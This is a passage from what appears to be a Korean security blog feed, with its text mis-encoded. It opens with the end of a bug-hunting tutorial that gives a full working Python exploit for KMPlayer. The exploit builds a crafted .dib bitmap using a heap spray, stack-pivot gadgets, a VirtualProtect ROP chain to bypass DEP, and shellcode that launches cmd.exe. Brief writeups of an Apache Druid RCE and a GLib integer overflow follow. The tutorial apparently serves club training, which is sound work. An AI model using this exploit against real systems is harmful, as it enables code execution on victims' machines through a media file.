ì‰˜ ì½”ë“œ ìƒì„±ì„ í•´ì•¼ í•˜ëŠ” ë° ì´ ë¶€ë¶„ì€ ì¸í„°ë„·ì„ ê²€ìƒ‰í•˜ë©´ ë§ì´ ë‚˜ì˜¤ê¸° ë•Œë¬¸ì— ìƒëµí•˜ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤. ê²°ë¡ ì ìœ¼ë¡œ <code>KMPlayer.exe</code> ì— Rebaseê°€ ì•ˆ ê±¸ë ¤ìˆì–´ì„œ <code>KMPlayer.exe</code> ì— ìˆëŠ” ê°€ì ¯ì„ ì‚¬ìš©í•˜ë„ë¡ í•  ê²ƒì´ê³ ìš”, ë©”íƒ€ìŠ¤í”Œë¡œì‡ì„ í†µí•´ì„œëŠ” ê³„ì‚°ê¸°ë¥¼ ì‹¤í–‰ì‹œí‚¤ëŠ” ì‰˜ ì½”ë“œë¥¼ ë§Œë“¤ ê²ƒì…ë‹ˆë‹¤.</p><p>ì¼ë‹¨ ASLRì€ ìŠ¤í”„ë ˆì´ë¡œ ì–´ëŠ ì •ë„ ì»¤ë²„í•˜ì˜€ê³  DEPë§Œ ë¬´ë ¥í™”ì‹œí‚¤ê³  ì‰˜ ì½”ë“œë¥¼ ì‘ì„±í•˜ë©´ ë©ë‹ˆë‹¤. DEPë¥¼ ë¬´ë ¥í™”í•˜ë ¤ë©´ ROPë¥¼ í•´ì•¼ì£ !! ì´ì œ <code>esp</code>ë¥¼ ìš°ë¦¬ ë°ì´í„°ê°€ ìˆëŠ” í™ ë©”ëª¨ë¦¬ë¡œ í”¼ë´‡ ì‹œí‚¬ ê²ƒì…ë‹ˆë‹¤. ìŒ ì ë‹¹í•œ ê°€ì ¯ì„ ì°¾ì•„ë³´ë„ë¡ í•˜ì£ .</p><pre><code class="hljs c"><span class="hljs-number">0x00523702</span> : # PUSH ECX # POP ESP # POP ESI # POP EBX # RETN</code></pre><p>ì¼ë¶€ë¡œ ë‘ ë²ˆ ë” <code>POP</code> í•´ì£¼ëŠ” ì´ìœ ëŠ” ìœ„ì— ë³´ì‹œë‹¤ì‹œí”¼ <code>0x11111111</code> ë¶€ë¶„ì— 8 ë°”ì´íŠ¸ê°€ ë‹¤ë¥¸ ë°ì´í„°ë¡œ ë®ì—¬ ìˆê¸° ë•Œë¬¸ì— ì´ 8 ë°”ì´íŠ¸ë¥¼ ë›°ì–´ë„˜ê³  ë¦¬í„´í•˜ê¸° ìœ„í•¨ì…ë‹ˆë‹¤.</p><p>ì ê·¸ëŸ¬ë©´ í˜ì´ë¡œë“œë¥¼ ì‘ì„±í•  ë•Œ ì•„ë˜ì™€ ê°™ì´ í•˜ë©´ ë˜ê² ë„¤ìš”.</p><p>ì œì¼ ì²˜ìŒ ë¶€ë¶„ì—ëŠ” ìœ„ ê°€ì ¯ì˜ ì£¼ì†Œë¥¼ ì‚¬ìš©í•  ê²ë‹ˆë‹¤. ê·¸ë¦¬ê³  ë°”ë¡œ ê·¸ ë’¤ì—ëŠ” ë˜ í”¼ë´‡ í•˜ëŠ” ê°€ì ¯ì„ ë„£ì–´ì¤„ ê²ë‹ˆë‹¤. ì´ë²ˆì—ëŠ” ê·¸ëƒ¥ í™ì—ì„œë§Œìš”. ì™œëƒí•˜ë©´ ì´ë²ˆì—ëŠ” <code>0x101cb056</code> ì— ë§¤í•‘ì´ ë˜ì—ˆì§€ë§Œ ë‹¤ìŒì— ë˜ ì´ ì–¸ì €ë¦¬ ì£¼ì†Œì— ë§¤í•‘ë  ë•Œë„ ì´ ì£¼ì†Œë¼ëŠ” ë³´ì¥ì´ ì—†ìœ¼ë‹ˆê¹ìš”. ìµœì†Œí•œ í•˜ìœ„ 2 ë°”ì´íŠ¸ëŠ” ë°”ë€Œê² ì£ . ê·¸ë ‡ê¸° ë•Œë¬¸ì— <code>esp</code>ë¥¼ ìŠ¤íƒì—ì„œ í™ìœ¼ë¡œ, ë‹¤ì‹œ í™ì—ì„œ ë‹¤ ë†’ì€ ì£¼ì†Œì˜ í™ìœ¼ë¡œ í”¼ë´‡ í•˜ëŠ” ê°€ì ¯ ë‘ ê°œë¥¼ ìŠ¤í”„ë ˆì´ í•´ì¤„ ê²ë‹ˆë‹¤. í™ì—ì„œ í™ìœ¼ë¡œ í”¼ë´‡ í•˜ëŠ” ê°€ì ¯ì€ ì•„ë˜ ê±¸ë¡œ ì“°ë„ë¡ í• ê²Œìš”.</p><pre><code class="hljs c"><span class="hljs-number">0x0095dffa</span> : # ADD ESP,<span class="hljs-number">19010</span> # POP EBP # POP EDI # POP ESI # POP EBX # RETN</code></pre><p>ê·¸ë¦¬ê³  ì¤‘ê°„ì¤‘ê°„ì— í”„ë¡œê·¸ë¨ì—ì„œ í™ì„ ì“°ë‹¤ê°€ ë°”ê¾¼ ë©”ëª¨ë¦¬ë“¤ì„ ìŠ¤í‚µí•  ìˆ˜ ìˆë„ë¡ ì•„ë˜ ê°€ì ¯ì„ ì‚¬ìš©í•˜ê² ìŠµë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-number">0x00433712</span> : # POP EDX # POP EDI # POP ESI # POP EBX # RETN</code></pre><p>ê·¸ë¦¬ê³  ì´ì œ ë†’ì€ ì£¼ì†Œë¡œ í”¼ë´‡ í–ˆìœ¼ë©´ ê·¸ ë¶€ë¶„ì—ë„ <code>ret</code>ìœ¼ë¡œ ìŠ¤í”„ë ˆì´ë¥¼ í•´ì£¼ë©´ ì¢€ ë” ì •í™•ë„ê°€ ë†’ì•„ì§€ê² ë„¤ìš” ã…ã…</p><p>ê·¸ëŸ¼ íŒŒì¼ì„ êµ¬ì„±í•  ë•Œì—ëŠ” ì•„ë˜ì™€ ê°™ì´ í•˜ë©´ ë˜ê² ë„¤ìš”</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/Untitled.png" alt="bughunting-tutorials-part4/Untitled.png"></p><p>ì•„ë˜ëŠ” ì œê°€ ì‘ì„±í•œ ìµìŠ¤í”Œë¡œì‡ ì½”ë“œì…ë‹ˆë‹¤.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack, unpack<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> OrderedDict<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_rop_chain</span>():</span><span class="hljs-comment"># rop chain generated with mona.py - www.corelan.be</span>rop_gadgets = [<span class="hljs-number">0x00453c50</span>, <span class="hljs-comment"># POP EDX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00d6a848</span>, <span class="hljs-comment"># ptr to &amp;VirtualProtect() [IAT KMPlayer.exe]</span><span class="hljs-number">0x0094eb72</span>, <span class="hljs-comment"># MOV EAX,DWORD PTR DS:[EDX] # RETN [KMPlayer.exe]</span><span class="hljs-number">0x007d2499</span>, <span class="hljs-comment"># XCHG EAX,ESI # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00652cb0</span>, <span class="hljs-comment"># POP EBP # RETN [KMPlayer.exe]</span><span class="hljs-number">0x0042390c</span>, <span class="hljs-comment"># &amp; jmp esp [KMPlayer.exe]</span><span class="hljs-number">0x004c0267</span>, <span class="hljs-comment"># POP EBX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00000201</span>, <span class="hljs-comment"># 0x00000201-&gt; ebx</span><span class="hljs-number">0x0052d95d</span>, <span class="hljs-comment"># POP EDX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00000040</span>, <span class="hljs-comment"># 0x00000040-&gt; edx</span><span class="hljs-number">0x0082f8e0</span>, <span class="hljs-comment"># POP ECX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00d0aafc</span>, <span class="hljs-comment"># &amp;Writable location [KMPlayer.exe]</span><span class="hljs-number">0x009fc414</span>, <span class="hljs-comment"># POP EDI # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00426485</span>, <span class="hljs-comment"># RETN (ROP NOP) [KMPlayer.exe]</span><span class="hljs-number">0x0068c402</span>, <span class="hljs-comment"># POP EAX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x90909090</span>, <span class="hljs-comment"># nop</span><span class="hljs-number">0x00744e56</span>, <span class="hljs-comment"># PUSHAD # RETN [KMPlayer.exe]</span>]<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, _) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> rop_gadgets)<span class="hljs-comment">#shellcode for runnig cmd.exe</span>shellcode = <span class="hljs-string">&quot;\x90&quot;</span>*<span class="hljs-number">0x100</span>shellcode += <span class="hljs-string">&quot;\xda\xd2\xd9\x74\x24\xf4\x5d\x29\xc9\xba\xfb\xe4\x15&quot;</span>shellcode += <span class="hljs-string">&quot;\xba\xb1\x30\x31\x55\x17\x03\x55\x17\x83\x16\x18\xf7&quot;</span>shellcode += <span class="hljs-string">&quot;\x4f\x14\x09\x7a\xaf\xe4\xca\x1b\x39\x01\xfb\x1b\x5d&quot;</span>shellcode += <span class="hljs-string">&quot;\x42\xac\xab\x15\x06\x41\x47\x7b\xb2\xd2\x25\x54\xb5&quot;</span>shellcode += <span class="hljs-string">&quot;\x53\x83\x82\xf8\x64\xb8\xf7\x9b\xe6\xc3\x2b\x7b\xd6&quot;</span>shellcode += <span class="hljs-string">&quot;\x0b\x3e\x7a\x1f\x71\xb3\x2e\xc8\xfd\x66\xde\x7d\x4b&quot;</span>shellcode += <span class="hljs-string">&quot;\xbb\x55\xcd\x5d\xbb\x8a\x86\x5c\xea\x1d\x9c\x06\x2c&quot;</span>shellcode += <span class="hljs-string">&quot;\x9c\x71\x33\x65\x86\x96\x7e\x3f\x3d\x6c\xf4\xbe\x97&quot;</span>shellcode += <span class="hljs-string">&quot;\xbc\xf5\x6d\xd6\x70\x04\x6f\x1f\xb6\xf7\x1a\x69\xc4&quot;</span>shellcode += <span class="hljs-string">&quot;\x8a\x1c\xae\xb6\x50\xa8\x34\x10\x12\x0a\x90\xa0\xf7&quot;</span>shellcode += <span class="hljs-string">&quot;\xcd\x53\xae\xbc\x9a\x3b\xb3\x43\x4e\x30\xcf\xc8\x71&quot;</span>shellcode += <span class="hljs-string">&quot;\x96\x59\x8a\x55\x32\x01\x48\xf7\x63\xef\x3f\x08\x73&quot;</span>shellcode += <span class="hljs-string">&quot;\x50\x9f\xac\xf8\x7d\xf4\xdc\xa3\xeb\x0b\x52\xde\x5e&quot;</span>shellcode += <span class="hljs-string">&quot;\x0b\x6c\xe0\xce\x64\x5d\x6b\x81\xf3\x62\xbe\xe5\x0c&quot;</span>shellcode += <span class="hljs-string">&quot;\x29\xe2\x4c\x85\xf4\x77\xcd\xc8\x06\xa2\x12\xf5\x84&quot;</span>shellcode += <span class="hljs-string">&quot;\x46\xeb\x02\x94\x23\xee\x4f\x12\xd8\x82\xc0\xf7\xde&quot;</span>shellcode += <span class="hljs-string">&quot;\x31\xe0\xdd\xbd\xd8\x7a\xde&quot;</span>p = <span class="hljs-keyword">lambda</span> x : pack(<span class="hljs-string">&quot;&lt;L&quot;</span>, x)up = <span class="hljs-keyword">lambda</span> x : unpack(<span class="hljs-string">&quot;&lt;L&quot;</span>, x)[<span class="hljs-number">0</span>]rop_chain = create_rop_chain()BITMAPFILEHEADER = OrderedDict()BITMAPINFOHEADER = OrderedDict()BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSize&#x27;</span>] = <span class="hljs-string">&#x27;\x28\x1f\x00\x00&#x27;</span> <span class="hljs-comment"># origin is 0x28</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biWidth&#x27;</span>] = p(<span class="hljs-number">0x1c48</span>)BITMAPINFOHEADER[<span class="hljs-string">&#x27;biHeight&#x27;</span>] = p(<span class="hljs-number">0x1c48</span>)BITMAPINFOHEADER[<span class="hljs-string">&#x27;biPlanes&#x27;</span>] = <span class="hljs-string">&#x27;\x01\x00&#x27;</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biBitCount&#x27;</span>] = <span class="hljs-string">&#x27;\x18\x00&#x27;</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biCompression&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x0a\x00\x00&#x27;</span> <span class="hljs-comment"># origin is 0x00</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSizeImage&#x27;</span>] = p(<span class="hljs-number">3</span> * (up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biWidth&#x27;</span>]) *up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biHeight&#x27;</span>])))BITMAPINFOHEADER[<span class="hljs-string">&#x27;biXPelsPerMeter&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00\x00\x00&#x27;</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biYPelsPerMeter&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00\x00\x00&#x27;</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biClrUsed&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x02\x00\x00&#x27;</span> <span class="hljs-comment"># origin is 0x00</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biClrImportant&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00\x00\x00&#x27;</span>BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfType&#x27;</span>] = <span class="hljs-string">&#x27;BM&#x27;</span>BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfsize&#x27;</span>] = p(up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSizeImage&#x27;</span>]) + <span class="hljs-number">0x36</span>)BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfReserved1&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00&#x27;</span>BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfReserved2&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00&#x27;</span>BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfOffBits&#x27;</span>] = <span class="hljs-string">&#x27;\x36\x00\x00\x00&#x27;</span>head = <span class="hljs-string">&#x27;Fandu_&#x27;</span>tail = <span class="hljs-string">&#x27;FANDU_&#x27;</span>spray = <span class="hljs-string">&#x27;\x11&#x27;</span>stack_to_heap = p(<span class="hljs-number">0x00523702</span>) <span class="hljs-comment"># PUSH ECX # POP ESP # POP ESI # POP EBX # RETN</span>heap_to_heap = p(<span class="hljs-number">0x0095ddef</span>) <span class="hljs-comment"># ADD ESP,19000 # POP EDI # POP ESI # POP EBX # RETN</span>pivot = p(<span class="hljs-number">0x00433712</span>) <span class="hljs-comment"># POP EDX # POP EDI # POP ESI # POP EBX # RETN</span>ret = p(<span class="hljs-number">0x00984e94</span>) <span class="hljs-comment"># RETN</span>offset1 = <span class="hljs-number">0x11111111</span> - <span class="hljs-number">0x101cb056</span> - <span class="hljs-number">0x600000</span> <span class="hljs-comment"># for calculating size of 0x11 spray</span>offset2 = <span class="hljs-number">0x197c0d11</span> - <span class="hljs-number">0x173772e1</span> - <span class="hljs-number">0x100000</span> <span class="hljs-comment"># for skip some data which are mutated</span>payload = <span class="hljs-string">&#x27;&#x27;</span>payload += head +<span class="hljs-string">&#x27;aa&#x27;</span>payload += spray * offset1payload += (heap_to_heap + stack_to_heap) * (<span class="hljs-number">0x400000</span> * <span class="hljs-number">2</span> / <span class="hljs-number">8</span>)payload += pivot * ((up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSizeImage&#x27;</span>]) - len(payload) - offset2 - <span class="hljs-number">0x1000</span> - len(tail)) / <span class="hljs-number">4</span>)payload += ret * (<span class="hljs-number">0x20000</span> / <span class="hljs-number">4</span>)payload += rop_chainpayload += shellcodepayload += spray * (up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSizeImage&#x27;</span>]) - len(payload)) <span class="hljs-comment">#dummy</span>payload += tailexploit = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> BITMAPFILEHEADER.keys() :exploit += BITMAPFILEHEADER[key]<span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> BITMAPINFOHEADER.keys() :exploit += BITMAPINFOHEADER[key]exploit += payloadf = open(<span class="hljs-string">&#x27;./exploit.dib&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)f.write(exploit)f.close()</code></pre><p>ê·¸ë¦¬ê³  ì´ íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰ì‹œì¼œ ë–¨ê¶ˆì§„ <code>exploit.dib</code> íŒŒì¼ì„ KMPlayerì— ë„£ì–´ ì‹¤í–‰í•˜ë©´!!!!</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--076.png" alt="bughunting-tutorials-part4/image--076.png"></p><p>ì´ë ‡ê²Œ <code>cmd.exe</code>ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤!!! ì§ì§ì§ ã…ã…ã…ã…ã…ã…</p><h1 id="ê·¸ì˜-ê³¼ê±°ì˜-ë§ˆì§€ë§‰-ì¡ë‹´"><a href="#ê·¸ì˜-ê³¼ê±°ì˜-ë§ˆì§€ë§‰-ì¡ë‹´" class="headerlink" title="ê·¸ì˜ (ê³¼ê±°ì˜) ë§ˆì§€ë§‰ ì¡ë‹´"></a>ê·¸ì˜ (ê³¼ê±°ì˜) ë§ˆì§€ë§‰ ì¡ë‹´</h1><p>ìœ¼ìœ¼ ë“œë””ì–´ ëë‚¬ë„¤ìš” ã…‹ã…‹ ì›ë˜ 12 ì›” ì¤‘ìˆœì¸ê°€ ë§ì¸ê°€ ì‹œì‘í–ˆëŠ” ë° 1 ì›”ì— ë©˜íƒˆì´ ë‚˜ê°€ ìˆì–´ ê°€ì§€ê³  ì´ì œì•¼ ëë‚¬ë„¤ìš” í›„ìš°â€¦ ì—­ì‹œ ë‚˜ ìƒˆë¼ëŠ” ê²Œìœ¼ë¥¸ ë†ˆâ€¦.</p><p>ì›ë˜ ì´ ê¸€ì„ ì“´ ì´ìœ ê°€ ë™ì•„ë¦¬ í›„ë°°ë“¤ êµìœ¡ì‹œí‚¤ê¸° ìœ„í•œ ê²ƒë„ ìˆì§€ë§Œ ì‚¬ì‹¤ ì „ì— cdpython í˜•ì´ ì´ ì·¨ì•½ì ìœ¼ë¡œ ë²„ê·¸í—ŒíŒ… ê¸€ ì“°ë©´ ì¢‹ì„ ê±° ê°™ë‹¤ê³  í•´ì„œ ì“°ê²Œ ëìŠµë‹ˆë‹¤ ã…‹ã…‹ ë§ì€ ë¶„ë“¤ì—ê²Œ ë„ì›€ì´ ë˜ì—ˆìœ¼ë©´ ì¢‹ê² ë„¤ìš”. ì‚¬ì‹¤ ìš”ì¦˜ ë„ˆë¬´ ì˜í•˜ëŠ” ì‚¬ëŒì´ ë§ì•„ì„œ ì´ëŸ° ê±° ë³´ëŠ” ì‚¬ëŒì´ ìˆê² ëƒë§Œì€â€¦ ì˜í•˜ëŠ” ì‚¬ëŒì€ ì´ê±° ë³´ì§€ë„ ì•Šê² ì§€â€¦ ì¥¬ë¥µ ë‚˜ë„ ì´ì œ ì˜í•´ì•¼ì§€â€¦. ã…‹ã…‹ã…‹ ê·¼ë° ì¼ë‹¨ ì¡¸ì—…ë¶€í„° í•˜ì¦ˆì•„ì•„ì•„ì•„ ã… ã… ã… ã… </p><p>ê·¸ë˜ë„ ì œê°€ ì´ ì •ë„ë¼ë„ í•  ìˆ˜ ìˆê²Œ ì±„ì°ì§ˆ í•´ì¤€ passket, combabo, cdpython, morinori89 í˜•ë“¤ ê°ì‚¬í•©ë‹ˆë‹¼ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ í›„ìš°â€¦. ì‚¬ì‹¤ í˜•ë“¤ì´ë‘ ì œì¼ ë§ì´ í•œ ê±°ëŠ” í•´í‚¹ë³´ë‹¤ëŠ” ìˆ  ì²˜ë¨¹ëŠ” ê±° ê°™ì§€ë§Œâ€¦. ê·¸ë¦¬ê³  ë¬¸ì„œ í”¼ë“œë°± ì¤€ SSG í›„ë°°ë“¤ Frozenbeer ë•¡íë•¡í ã…‹ã…‹ã…‹</p><p>ê·¸ëŸ¼ ë‹¤ë“¤ ì¦í–Œ!!!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>bug hunting</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-25646: Apache Druid ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì </title>
    <link href="/2021/03/31/fabu1ous/2021-03-31/"/>
    <url>/2021/03/31/fabu1ous/2021-03-31/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://www.zerodayinitiative.com/blog/2021/3/25/cve-2021-25646-getting-code-execution-on-apache-druid">CVE-2021-25646 : Getting Code Execution on Apache Druid</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Apache Druid &lt;= 0.20.0</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Apache DruidëŠ” Requestë¥¼ í†µí•´ ì‚¬ìš©ì ì œê³µ JavaScriptì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ê¸°ëŠ¥ì´  ìˆìŠµë‹ˆë‹¤. ì´ ê¸°ëŠ¥ì€ ì‹ ë¢°ë„ê°€ ë†’ì€ í™˜ê²½ì—ì„œ ì‚¬ìš©í•˜ê¸° ìœ„í•œ ê²ƒì´ë¯€ë¡œ ê¸°ë³¸ì ìœ¼ë¡œ ë¹„í™œì„±í™”ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ Druid 0.20.0 ì´ì „ ë²„ì „ì—ì„œëŠ” ì„œë²„ êµ¬ì„±ì— ê´€ê³„ì—†ì´ ì‚¬ìš©ìê°€ ì œê³µí•œ JavaScript ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì (CVE-2021-25646)ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ì»¤ëŠ” í•´ë‹¹ ì·¨ì•½ì ì„ ì•…ìš©í•´ Druid ì„œë²„ í”„ë¡œì„¸ìŠ¤ì˜ ê¶Œí•œìœ¼ë¡œ íƒ€ê²Ÿ ì‹œìŠ¤í…œì—ì„œ ì›ê²© ì½”ë“œì‹¤í–‰ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p>CVE-2021-25646ì€ Apache Druidì˜ Jacksonì´ JavaScript íƒ€ì…ì˜ JSON ë°ì´í„° êµ¬ë¬¸ì„ íŒŒì‹±í•˜ëŠ” ê³¼ì •ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤. </p><pre><code class="hljs java"><span class="hljs-meta">@JsonCreator</span> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">JavaScriptDimFilter</span><span class="hljs-params">(<span class="hljs-meta">@JsonProperty(&quot;dimension&quot;)</span> String dimension, <span class="hljs-meta">@JsonProperty(&quot;function&quot;)</span> </span></span><span class="hljs-function"><span class="hljs-params">            String function, <span class="hljs-meta">@JsonProperty(&quot;extractionFn&quot;)</span> <span class="hljs-meta">@Nullable</span> ExtractionFn extractionFn, </span></span><span class="hljs-function"><span class="hljs-params">            <span class="hljs-meta">@JsonProperty(&quot;filterTuning&quot;)</span> <span class="hljs-meta">@Nullable</span> FilterTuning filterTuning, </span></span><span class="hljs-function"><span class="hljs-params">            <span class="hljs-meta">@JacksonInject</span> JavaScriptConfig config)</span> </span><span class="hljs-function"></span>&#123;   Preconditions.checkArgument(dimension != <span class="hljs-keyword">null</span>, <span class="hljs-string">&quot;dimension must not be null&quot;</span>);   Preconditions.checkArgument(function != <span class="hljs-keyword">null</span>, <span class="hljs-string">&quot;function must not be null&quot;</span>);   <span class="hljs-keyword">this</span>.dimension = dimension;   <span class="hljs-keyword">this</span>.function = function;   <span class="hljs-keyword">this</span>.extractionFn = extractionFn;   <span class="hljs-keyword">this</span>.filterTuning = filterTuning;   <span class="hljs-keyword">this</span>.config = config; &#125;</code></pre><p>JSON ë°ì´í„°ì˜  <code>name</code>ì†ì„±ì´  â€œâ€ì¼ ë•Œ ë¹ˆ í‚¤ê°’ì„ JavaScriptDimFilter í´ë˜ìŠ¤ì˜  <code>config</code>íŒŒë¼ë¯¸í„°ì— ë°”ì¸ë”© ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ í•´ì»¤ëŠ” JavaScript ì‹¤í–‰ ì„¤ì •ì„ í™œì„±í™”í•˜ì—¬ <code>function</code> í‚¤ê°’ìœ¼ë¡œ ì œê³µí•œ JavaScript ì½”ë“œë¥¼ ì‹¤í•¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>apache</tag>
      
      <tag>javascript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-27219: GLibì˜ integer overflow ì·¨ì•½ì </title>
    <link href="/2021/03/30/l0ch/2021-03-30/"/>
    <url>/2021/03/30/l0ch/2021-03-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-045-g_bytes_new/">GHSL-2021-045: Integer Overflow in GLib - CVE-2021-27219</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>í…ŒìŠ¤íŠ¸ëœ ë²„ì „</p><ul><li>Ubuntu 20.04 (x86_64) : ë²„ì „ 2.64.6-1</li><li>CentOS Stream (x86_64) : ë²„ì „ 2.56.4-9</li><li>archlinux (x86_64) : 2.66.4-2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>64ë¹„íŠ¸ í”Œë«í¼ì˜ glibì—ì„œ ì•”ì‹œì  í˜• ë³€í™˜ìœ¼ë¡œ ì¸í•œ integer overflow ì·¨ì•½ì ì´ ë°œê²¬ë˜ì–´ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì€ ë°ì´í„°ë¡œë¶€í„° <a href="https://developer.gnome.org/glib/stable/glib-Byte-Arrays.html#GBytes">GBytes</a> ê°ì²´ë¥¼ ìƒì„±í•˜ëŠ” <a href="https://developer.gnome.org/glib/stable/glib-Byte-Arrays.html#g-bytes-new">g_bytes_new()</a> í•¨ìˆ˜ì— ì¡´ì¬í•©ë‹ˆë‹¤.</p><pre><code class="hljs jsx">GBytes * g_bytes_new (gconstpointer data, gsize size)&#123;  g_return_val_if_fail (data != NULL || size == <span class="hljs-number">0</span>, NULL);<span class="hljs-comment">//integer overflow</span>  <span class="hljs-keyword">return</span> g_bytes_new_take(g_memdup (data, size), size);  &#125;</code></pre><p>64bit ìë£Œí˜•ì¸ <code>gsize</code> í˜• <code>size</code>ë¥¼ <code>g_memdup</code> í•¨ìˆ˜ì˜ ë‘ ë²ˆì§¸ ì¸ìë¡œ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-comment">//g_memdup í•¨ìˆ˜ ì›í˜•</span>g_memdup(gconstpointer mem, guint byte_size);</code></pre><p>ê·¸ëŸ¬ë‚˜ <code>g_memdup</code>ì€ í•´ë‹¹ ì¸ìë¥¼ 32bit ìë£Œí˜• <code>guint</code>ìœ¼ë¡œ ë°›ì•„ ì•”ì‹œì  í˜• ë³€í™˜ì´ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤. ì´ë¡œ ì¸í•´ í›¨ì”¬ ì‘ì€ ë°ì´í„° ë²„í¼ë¥¼ í¬í•¨í•˜ëŠ” GBytes ê°ì²´ë¥¼ ë°˜í™˜í•˜ê³  ì´ëŠ” memory corruption ì·¨ì•½ì ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì˜ íŒ¨ì¹˜ íˆìŠ¤í† ë¦¬ëŠ” <a href="https://gitlab.gnome.org/GNOME/glib/-/merge_requests/1926/commits">https://gitlab.gnome.org/GNOME/glib/-/merge_requests/1926/commits</a> ì—ì„œ í™•ì¸ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>integer overflow</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Cisco Jabberì—ì„œ ë°œê²¬ëœ 5ê°€ì§€ ì·¨ì•½ì </title>
    <link href="/2021/03/29/idioth/2021-03-29/"/>
    <url>/2021/03/29/idioth/2021-03-29/</url>
    
